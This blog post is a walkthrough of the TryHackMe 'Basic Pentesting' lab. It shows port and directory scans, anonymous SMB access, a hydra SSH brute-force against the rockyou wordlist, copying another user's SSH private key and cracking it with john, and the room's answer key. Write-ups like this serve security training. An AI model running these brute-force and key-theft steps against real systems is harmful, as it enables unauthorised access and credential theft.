<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><title>Wh1teJ0kerのBlog</title>
<meta charset=utf-8><meta name=description content="Ladder@日常练习"><meta name=author content="Wh1teJ0ker"><link rel=canonical href=https://wh1tej0ker.github.io/post/tryhackmeeasybasic-pentesting-21olpr.html><link rel=alternate type=application/rss+xml href=https://wh1tej0ker.github.io//index.xml title=Wh1teJ0kerのBlog><script async defer data-website-id=56cc42c1-3656-4d3e-af3c-acded927b8ed src=https://analytics.umami.is/script.js></script><meta property="og:url" content="https://wh1tej0ker.github.io/post/tryhackmeeasybasic-pentesting-21olpr.html"><meta property="og:site_name" content="Wh1teJ0kerのBlog"><meta property="og:title" content="Tryhackme-easy-Basic Pentesting"><meta property="og:description" content="日常练习"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2024-08-14T14:08:59+08:00"><meta property="article:modified_time" content="2025-05-07T21:28:15+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Tryhackme-easy-Basic Pentesting"><meta name=twitter:description content="日常练习"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://wh1tej0ker.github.io/post/"},{"@type":"ListItem","position":2,"name":"Tryhackme-easy-Basic Pentesting","item":"https://wh1tej0ker.github.io/post/tryhackmeeasybasic-pentesting-21olpr.html"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Tryhackme-easy-Basic Pentesting","name":"Tryhackme-easy-Basic Pentesting","description":"日常练习","keywords":[],"articleBody":"Tryhackme-easy-Basic Pentesting Basic Pentesting Web App Testing and Privilege Escalation 先进行信息搜集，看端口，找目录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 ┌──(kali㉿kali)-[~/桌面] └─$ nmap -sV -sC -T4 10.10.233.69 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 07:01 EDT Nmap scan report for 10.10.233.69 Host is up (0.27s latency). Not shown: 955 closed tcp ports (conn-refused), 39 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA) | 256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA) |_ 256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9.0.7 |_http-title: Apache Tomcat/9.0.7 |_http-favicon: Apache Tomcat Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_nbstat: NetBIOS name: BASIC2, NetBIOS user: , NetBIOS MAC: (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: basic2 | NetBIOS computer name: BASIC2\\x00 | Domain name: \\x00 | FQDN: basic2 |_ System time: 2024-03-11T07:02:44-04:00 | smb2-time: | date: 2024-03-11T11:02:44 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 73.19 seconds 扫描过程中，估计是网络问题，dirsearch一直崩，但是好歹是扫描出来一个异常目录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ┌──(kali㉿kali)-[~/桌面] └─$ dirsearch -u 10.10.233.69 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/kali/桌面/reports/_10.10.233.69/_24-03-11_06-57-34.txt Target: http://10.10.233.69/ [06:57:34] Starting: [06:57:50] 403 - 298B - /.ht_wsr.txt [06:57:50] 403 - 301B - /.htaccess.bak1 [06:57:50] 403 - 301B - /.htaccess.orig [06:57:51] 403 - 302B - /.htaccess_extra [06:57:51] 403 - 303B - /.htaccess.sample [06:57:51] 403 - 301B - /.htaccess_orig [06:57:51] 403 - 299B - /.htaccessBAK [06:57:51] 403 - 299B - /.htaccess_sc [06:57:51] 403 - 292B - /.html [06:57:51] 403 - 301B - /.htaccess.save [06:57:51] 403 - 298B - /.httr-oauth [06:57:51] 403 - 297B - /.htpasswds [06:57:51] 403 - 301B - /.htpasswd_test [06:57:51] 403 - 300B - /.htaccessOLD2 [06:57:51] 403 - 291B - /.htm [06:57:52] 403 - 299B - /.htaccessOLD [06:58:48] 200 - 476B - /development/ 提交的隐藏目录也是正确的\n访问development目录，找到两个文件\ndev.txt\n1 2 3 4 5 6 7 8 2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too. Haven't made any real web apps yet, but I have tried that example you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K 2018-04-22: SMB has been configured. -K 2018-04-21: I got Apache set up. Will put in our content later. -J j.txt\n1 2 3 4 5 6 7 For J: I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials, and I was able to crack your hash really easily. You know our password policy, so please follow it? Change that password ASAP. -K 在查阅过程中，发现存在一个SMB枚举工具enum4linux，但是反复尝试了几次，都未能成功枚举出用户\n奇了个怪了，每次扫描的结果还不一样，当然，我估计大概率还是网络问题\n确实是，换了个欧洲节点快了不少，我自己的问题\n1 2 [+] Attempting to map shares on 10.10.233.69 //10.10.233.69/Anonymous Mapping: OK Listing: OK Writing: N/A 从这条信息中，已经可以看出存在匿名登录，但是应该可以直接扫出需要的用户名，不知道为什么没有（\n1 smbclient //10.10.233.69/anonymous 成功登录上，发现存在staff.txt\n1 2 3 4 5 6 7 8 ┌──(kali㉿kali)-[~/桌面] └─$ cat staff.txt Announcement to staff: PLEASE do not upload non-work-related items to this share. I know it's all in fun, but this is how mistakes happen. (This means you too, Jan!) -Kay 然后开始爆破账户密码\n1 hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.82.249 ssh 出现了小小的问题，网络原因导致我这边爆破几乎无用，这一步只能暂时省略一下\n1 armando 登录账户\n1 ssh jan@10.10.82.249 得到立足点之后，开始思考提权\n在当前目录下无有价值信息，发现还存在另一个登录用户目录kay，但是权限不足，无法查看pass.bak\n开始进行枚举，查找相关提权思路\n1 2 jan@basic2:/home/kay$ ls -a . .. .bash_history .bash_logout .bashrc .cache .lesshst .nano pass.bak .profile .ssh .sudo_as_admin_successful .viminfo 发现存在ssh文件\n1 2 3 4 5 6 7 jan@basic2:/home/kay$ ls -la ./.ssh total 20 drwxr-xr-x 2 kay kay 4096 Apr 23 2018 . drwxr-xr-x 5 kay kay 4096 Apr 23 2018 .. -rw-rw-r-- 1 kay kay 771 Apr 23 2018 authorized_keys -rw-r--r-- 1 kay kay 3326 Apr 19 2018 id_rsa -rw-r--r-- 1 kay kay 771 Apr 19 2018 id_rsa.pub 有rsa密钥文件，复制下来保存到一个文件中，尝试破解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(kali㉿kali)-[~/桌面] └─$ vim idrsa ┌──(kali㉿kali)-[~/桌面] └─$ ssh2john idrsa \u003e idrsahash ┌──(kali㉿kali)-[~/桌面] └─$ john idrsahash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status beeswax (idrsa) 1g 0:00:00:00 DONE (2024-03-12 04:54) 50.00g/s 4137Kp/s 4137Kc/s 4137KC/s behlat..bammer Use the \"--show\" option to display all of the cracked passwords reliably Session completed. 成功破解出密码\n1 ssh -i id_rsa kay@10.10.82.249 然后开始读取\n1 2 cat pass.bak heresareallystrongpasswordthatfollowsthepasswordpolicy$$ Answer Deploy the machine and connect to our network Find the services exposed by the machine What is the name of the hidden directory on the web server(enter name without /)? 1 development User brute-forcing to find the username \u0026 password What is the username? 1 Jan What is the password? 1 armando What service do you use to access the server(answer in abbreviation in all caps)? 1 ssh Enumerate the machine to find any vectors for privilege escalation What is the name of the other user you found(all lower case)? 1 kay If you have found another user, what can you do with this information? What is the final password you obtain? 1 heresareallystrongpasswordthatfollowsthepasswordpolicy$$ ","wordCount":"1643","inLanguage":"en","datePublished":"2024-08-14T14:08:59+08:00","dateModified":"2025-05-07T21:28:15+08:00","author":{"@type":"Person","name":"Wh1teJ0ker"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://wh1tej0ker.github.io/post/tryhackmeeasybasic-pentesting-21olpr.html"},"publisher":{"@type":"Organization","name":"Wh1teJ0kerのBlog","logo":{"@type":"ImageObject","url":"https://wh1tej0ker.github.io/favicon.ico"}}}</script><link rel=icon type=image/png href=/favicon.ico sizes=16x16><link rel=apple-touch-icon href=/favicon.ico><link rel=manifest href=/favicon.ico><link rel=stylesheet href=https://cdn.staticfile.org/lxgw-wenkai-webfont/1.6.0/style.css><link rel=stylesheet href=/css/main.min.9d998bab4720091d5ec1e0fbbffd92b254a2e791623df6106cd7ea760bfc5c28.css integrity="sha256-nZmLq0cgCR1eweD7v/2SslSi55FiPfYQbNfqdgv8XCg=" crossorigin=anonymous media=screen><link rel=stylesheet href=/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css><script src=/js/highlight.min.min.c607d6febd16934a82eb61d3a896ed9d869f54373cc63ce95864ed5488fe3128.js></script><script>hljs.highlightAll()</script></head><body><main class=wrapper><nav class=navigation><section class=container><a class=navigation-brand href=/>HOME
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><span></span><span></span><span></span></label><ul class=navigation-list id=navigation-list><li class="navigation-item navigation-menu"><a class=navigation-link href=/categories/>分类</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/archives/>归档</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/friends/>友链</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/about/>关于</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=https://cloud.umami.is/share/5RZUCwaG2fOysYPa/wh1tej0ker.github.io>Dashboard</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class="navigation-item navigation-social"><a class=navigation-link href=https://github.com/Wh1teJ0ker><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></li></ul></section></nav><div id=content><article class=blog-single><header class=blog-title><h1>Tryhackme-easy-Basic Pentesting</h1></header><p><small>August 14, 2024&nbsp;· &nbsp;·</small><p><div class=blog-toc><nav id=TableOfContents><ul><li><a href=#web-app-testing-and-privilege-escalation>Web App Testing and Privilege Escalation</a></li><li><a href=#answer>Answer</a></li></ul></nav></div><section class=blog-content><h1 id=tryhackme-easy-basic-pentesting>Tryhackme-easy-Basic Pentesting</h1><h1 id=basic-pentesting>Basic Pentesting</h1><h2 id=web-app-testing-and-privilege-escalation>Web App Testing and Privilege Escalation</h2><p>先进行信息搜集，看端口，找目录</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>┌──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ nmap -sV -sC -T4 10.10.233.69
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 07:01 EDT
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.233.69
</span></span><span class=line><span class=cl>Host is up (0.27s latency).
</span></span><span class=line><span class=cl>Not shown: 955 closed tcp ports (conn-refused), 39 filtered tcp ports (no-response)
</span></span><span class=line><span class=cl>PORT     STATE SERVICE     VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey: 
</span></span><span class=line><span class=cl>|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
</span></span><span class=line><span class=cl>|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
</span></span><span class=line><span class=cl>|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
</span></span><span class=line><span class=cl>80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: Site doesn&#39;t have a title (text/html).
</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span></span><span class=line><span class=cl>445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
</span></span><span class=line><span class=cl>8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
</span></span><span class=line><span class=cl>| ajp-methods: 
</span></span><span class=line><span class=cl>|_  Supported methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>8080/tcp open  http        Apache Tomcat 9.0.7
</span></span><span class=line><span class=cl>|_http-title: Apache Tomcat/9.0.7
</span></span><span class=line><span class=cl>|_http-favicon: Apache Tomcat
</span></span><span class=line><span class=cl>Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl>|_nbstat: NetBIOS name: BASIC2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span></span><span class=line><span class=cl>| smb-os-discovery: 
</span></span><span class=line><span class=cl>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
</span></span><span class=line><span class=cl>|   Computer name: basic2
</span></span><span class=line><span class=cl>|   NetBIOS computer name: BASIC2\x00
</span></span><span class=line><span class=cl>|   Domain name: \x00
</span></span><span class=line><span class=cl>|   FQDN: basic2
</span></span><span class=line><span class=cl>|_  System time: 2024-03-11T07:02:44-04:00
</span></span><span class=line><span class=cl>| smb2-time: 
</span></span><span class=line><span class=cl>|   date: 2024-03-11T11:02:44
</span></span><span class=line><span class=cl>|_  start_date: N/A
</span></span><span class=line><span class=cl>| smb2-security-mode: 
</span></span><span class=line><span class=cl>|   3:1:1: 
</span></span><span class=line><span class=cl>|_    Message signing enabled but not required
</span></span><span class=line><span class=cl>| smb-security-mode: 
</span></span><span class=line><span class=cl>|   account_used: guest
</span></span><span class=line><span class=cl>|   authentication_level: user
</span></span><span class=line><span class=cl>|   challenge_response: supported
</span></span><span class=line><span class=cl>|_  message_signing: disabled (dangerous, but default)
</span></span><span class=line><span class=cl>|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 73.19 seconds
</span></span></code></pre></td></tr></table></div></div><p>扫描过程中，估计是网络问题，dirsearch一直崩，但是好歹是扫描出来一个异常目录</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>┌──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ dirsearch -u 10.10.233.69 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  _|. _ _  _  _  _ _|_    v0.4.3 
</span></span><span class=line><span class=cl> (_||| _) (/_(_|| (_| )                                                                     
</span></span><span class=line><span class=cl>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Output File: /home/kali/桌面/reports/_10.10.233.69/_24-03-11_06-57-34.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Target: http://10.10.233.69/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[06:57:34] Starting:                                                                                
</span></span><span class=line><span class=cl>[06:57:50] 403 -  298B  - /.ht_wsr.txt                                  
</span></span><span class=line><span class=cl>[06:57:50] 403 -  301B  - /.htaccess.bak1                               
</span></span><span class=line><span class=cl>[06:57:50] 403 -  301B  - /.htaccess.orig
</span></span><span class=line><span class=cl>[06:57:51] 403 -  302B  - /.htaccess_extra                              
</span></span><span class=line><span class=cl>[06:57:51] 403 -  303B  - /.htaccess.sample
</span></span><span class=line><span class=cl>[06:57:51] 403 -  301B  - /.htaccess_orig
</span></span><span class=line><span class=cl>[06:57:51] 403 -  299B  - /.htaccessBAK
</span></span><span class=line><span class=cl>[06:57:51] 403 -  299B  - /.htaccess_sc
</span></span><span class=line><span class=cl>[06:57:51] 403 -  292B  - /.html
</span></span><span class=line><span class=cl>[06:57:51] 403 -  301B  - /.htaccess.save                               
</span></span><span class=line><span class=cl>[06:57:51] 403 -  298B  - /.httr-oauth                                  
</span></span><span class=line><span class=cl>[06:57:51] 403 -  297B  - /.htpasswds
</span></span><span class=line><span class=cl>[06:57:51] 403 -  301B  - /.htpasswd_test                               
</span></span><span class=line><span class=cl>[06:57:51] 403 -  300B  - /.htaccessOLD2                                
</span></span><span class=line><span class=cl>[06:57:51] 403 -  291B  - /.htm
</span></span><span class=line><span class=cl>[06:57:52] 403 -  299B  - /.htaccessOLD
</span></span><span class=line><span class=cl>[06:58:48] 200 -  476B  - /development/
</span></span></code></pre></td></tr></table></div></div><p>提交的隐藏目录也是正确的</p><p>访问development目录，找到两个文件</p><p>dev.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>2018-04-23: I&#39;ve been messing with that struts stuff, and it&#39;s pretty cool! I think it might be neat
</span></span><span class=line><span class=cl>to host that on this server too. Haven&#39;t made any real web apps yet, but I have tried that example
</span></span><span class=line><span class=cl>you get to show off how it works (and it&#39;s the REST version of the example!). Oh, and right now I&#39;m 
</span></span><span class=line><span class=cl>using version 2.5.12, because other versions were giving me trouble. -K
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2018-04-22: SMB has been configured. -K
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2018-04-21: I got Apache set up. Will put in our content later. -J
</span></span></code></pre></td></tr></table></div></div><p>j.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>For J:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>I&#39;ve been auditing the contents of /etc/shadow to make sure we don&#39;t have any weak credentials,
</span></span><span class=line><span class=cl>and I was able to crack your hash really easily. You know our password policy, so please follow
</span></span><span class=line><span class=cl>it? Change that password ASAP.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-K
</span></span></code></pre></td></tr></table></div></div><p>在查阅过程中，发现存在一个SMB枚举工具enum4linux，但是反复尝试了几次，都未能成功枚举出用户</p><p>奇了个怪了，每次扫描的结果还不一样，当然，我估计大概率还是网络问题</p><p>确实是，换了个欧洲节点快了不少，我自己的问题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>[+] Attempting to map shares on 10.10.233.69                                                        
</span></span><span class=line><span class=cl>//10.10.233.69/Anonymous        Mapping: OK Listing: OK Writing: N/A
</span></span></code></pre></td></tr></table></div></div><p>从这条信息中，已经可以看出存在匿名登录，但是应该可以直接扫出需要的用户名，不知道为什么没有（</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>smbclient //10.10.233.69/anonymous
</span></span></code></pre></td></tr></table></div></div><p>成功登录上，发现存在staff.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>┌──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ cat staff.txt 
</span></span><span class=line><span class=cl>Announcement to staff:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PLEASE do not upload non-work-related items to this share. I know it&#39;s all in fun, but
</span></span><span class=line><span class=cl>this is how mistakes happen. (This means you too, Jan!)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-Kay
</span></span></code></pre></td></tr></table></div></div><p>然后开始爆破账户密码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.82.249 ssh
</span></span></code></pre></td></tr></table></div></div><p>出现了小小的问题，网络原因导致我这边爆破几乎无用，这一步只能暂时省略一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>armando
</span></span></code></pre></td></tr></table></div></div><p>登录账户</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>ssh jan@10.10.82.249
</span></span></code></pre></td></tr></table></div></div><p>得到立足点之后，开始思考提权</p><p>在当前目录下无有价值信息，发现还存在另一个登录用户目录kay，但是权限不足，无法查看pass.bak</p><p>开始进行枚举，查找相关提权思路</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>jan@basic2:/home/kay$ ls -a
</span></span><span class=line><span class=cl>.  ..  .bash_history  .bash_logout  .bashrc  .cache  .lesshst  .nano  pass.bak  .profile  .ssh  .sudo_as_admin_successful  .viminfo
</span></span></code></pre></td></tr></table></div></div><p>发现存在ssh文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>jan@basic2:/home/kay$ ls -la ./.ssh
</span></span><span class=line><span class=cl>total 20
</span></span><span class=line><span class=cl>drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
</span></span><span class=line><span class=cl>drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
</span></span><span class=line><span class=cl>-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
</span></span><span class=line><span class=cl>-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
</span></span><span class=line><span class=cl>-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
</span></span></code></pre></td></tr></table></div></div><p>有rsa密钥文件，复制下来保存到一个文件中，尝试破解</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>┌──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ vim idrsa   
</span></span><span class=line><span class=cl>                                                                                                    
</span></span><span class=line><span class=cl>┌──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ ssh2john idrsa &gt; idrsahash
</span></span><span class=line><span class=cl>                                                                                                    
</span></span><span class=line><span class=cl>┌──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ john idrsahash --wordlist=/usr/share/wordlists/rockyou.txt
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
</span></span><span class=line><span class=cl>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
</span></span><span class=line><span class=cl>Cost 2 (iteration count) is 1 for all loaded hashes
</span></span><span class=line><span class=cl>Will run 4 OpenMP threads
